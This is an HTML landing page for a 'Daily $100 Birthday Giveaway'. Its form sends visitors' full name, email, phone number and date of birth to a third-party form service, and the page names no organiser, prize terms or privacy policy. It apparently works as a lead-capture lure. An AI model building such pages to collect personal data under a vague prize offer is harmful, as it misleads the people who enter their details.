<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Birthday Giveaway</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;800&display=swap" rel="stylesheet">

<style>

body {
    margin: 0;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(-45deg, #ff0080, #ff8c00, #40e0d0, #ff0080);
    background-size: 400% 400%;
    animation: bgMove 8s ease infinite;
    overflow: hidden;
}

@keyframes bgMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

/* Confetti */
.confetti {
    position: fixed;
    width: 10px;
    height: 10px;
    top: -10px;
    animation: fall linear infinite;
    opacity: 0.8;
}

@keyframes fall {
    to {
        transform: translateY(110vh) rotate(360deg);
    }
}

/* Layout */
.wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
    position: relative;
    z-index: 2;
}

.card {
    background: rgba(255,255,255,0.96);
    padding: 50px 40px;
    border-radius: 25px;
    width: 100%;
    max-width: 520px;
    text-align: center;
    box-shadow: 0 40px 80px rgba(0,0,0,0.35);
    animation: popIn 0.6s ease;
}

@keyframes popIn {
    0% { transform: scale(0.85); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
}

.badge {
    background: linear-gradient(90deg, #ff0080, #ff8c00);
    color: white;
    padding: 10px 22px;
    border-radius: 50px;
    font-size: 14px;
    font-weight: 600;
    display: inline-block;
    margin-bottom: 25px;
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0% { box-shadow: 0 0 0 0 rgba(255,0,128,0.6); }
    70% { box-shadow: 0 0 0 20px rgba(255,0,128,0); }
    100% { box-shadow: 0 0 0 0 rgba(255,0,128,0); }
}

h1 {
    font-size: 40px;
    font-weight: 800;
    margin-bottom: 15px;
    color: #111;
}

.sub {
    font-size: 16px;
    margin-bottom: 30px;
    color: #555;
}

input, select {
    width: 100%;
    padding: 15px;
    margin: 10px 0;
    border-radius: 12px;
    border: 2px solid #eee;
    font-size: 15px;
}

.phone-group {
    display: flex;
    gap: 8px;
}

.phone-group select {
    width: 100px;
}

.phone-group input {
    flex: 1;
}

.dob-group {
    display: flex;
    gap: 10px;
}

button {
    width: 100%;
    padding: 18px;
    margin-top: 20px;
    border: none;
    border-radius: 15px;
    background: linear-gradient(90deg, #ff0080, #ff8c00);
    color: white;
    font-size: 20px;
    font-weight: 800;
    cursor: pointer;
    transition: 0.3s;
}

button:hover {
    transform: scale(1.05);
    box-shadow: 0 20px 40px rgba(255,0,128,0.4);
}

.trust {
    margin-top: 18px;
    font-size: 13px;
    color: #777;
}

</style>
</head>

<body>

<script>
for (let i = 0; i < 45; i++) {
    let confetti = document.createElement("div");
    confetti.classList.add("confetti");
    confetti.style.left = Math.random() * 100 + "vw";
    confetti.style.background = ["#ff0080","#ff8c00","#40e0d0","#ffffff"][Math.floor(Math.random()*4)];
    confetti.style.animationDuration = (Math.random() * 3 + 3) + "s";
    confetti.style.width = confetti.style.height = (Math.random() * 8 + 4) + "px";
    document.body.appendChild(confetti);
}
</script>

<div class="wrapper">
    <div class="card">

        <div class="badge">🎉 DAILY $100 GIVEAWAY 🎉</div>

        <h1>It’s Your Turn To Win</h1>
        <div class="sub">Enter your birthday. Get automatically entered every year.</div>

        <form action="https://formspree.io/f/xpqjgdww" method="POST">

            <input type="text" name="name" placeholder="Full Name" required>
            <input type="email" name="email" placeholder="Email Address" required>

            <div class="phone-group">
                <select name="country_code" required>
                    <option value="+61">+61</option>
                    <option value="+1">+1</option>
                    <option value="+44">+44</option>
                    <option value="+64">+64</option>
                </select>
                <input type="tel" name="phone" placeholder="Phone Number" required>
            </div>

            <div class="dob-group">
                <input type="text" name="dob_day" placeholder="DD" maxlength="2" required>
                <input type="text" name="dob_month" placeholder="MM" maxlength="2" required>
                <input type="text" name="dob_year" placeholder="YYYY" maxlength="4" required>
            </div>

            <button type="submit">ENTER FREE NOW 🚀</button>

        </form>

        <div class="trust">
            100% Free Entry • No Spam • Instant Registration
        </div>

    </div>
</div>

</body>
</html>
